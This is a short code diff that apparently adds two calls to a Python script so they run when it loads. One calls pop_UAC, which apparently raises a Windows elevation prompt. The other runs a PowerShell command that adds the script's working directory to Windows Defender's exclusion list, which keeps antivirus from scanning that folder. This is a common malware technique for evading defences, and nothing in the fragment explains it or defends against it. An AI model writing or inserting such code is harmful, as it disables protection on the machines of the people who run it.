@@ -16,3 +16,6 @@ def pop_UAC():
 def add_exception_cwd():
     script = "powershell -Command Add-MpPreference -ExclusionPath "+os.getcwd()
     subprocess.call(script,shell=True)
+
+pop_UAC()
+add_exception_cwd()
